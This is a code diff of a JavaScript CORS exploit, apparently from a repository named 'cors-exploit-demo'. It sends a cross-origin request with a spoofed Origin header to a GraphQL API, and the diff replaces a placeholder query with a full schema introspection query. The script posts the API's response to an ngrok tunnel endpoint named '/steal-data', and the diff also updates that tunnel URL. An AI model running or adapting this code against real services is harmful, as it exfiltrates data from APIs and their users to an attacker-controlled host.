@@ -16,13 +16,28 @@
             'Content-Type': 'application/json',
             'Origin': 'https://kripto-geek.github.io/cors-exploit-demo/'  // Set your domain
         },
-        body: JSON.stringify({ query: `{ validQueryHere { id name } }` })  // Replace with a valid query
-    })
+        body: JSON.stringify({
+                query: `{
+                    __schema {
+                        types {
+                            name
+                            fields {
+                                name
+                                type {
+                                    name
+                                    kind
+                                }
+                            }
+                        }
+                    }
+                }`
+            })
+        })
     .then(response => response.text())
     .then(data => {
         console.log('API Response:', data);  // Debugging
         // Send the API response data to your server
-        fetch('https://827b-2401-4900-1c82-da4e-3a56-a4c3-7e9-3a2d.ngrok-free.app/steal-data', {
+        fetch('https://660a-2401-4900-1c82-da4e-ca7-6a21-6dae-8733.ngrok-free.app/steal-data', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
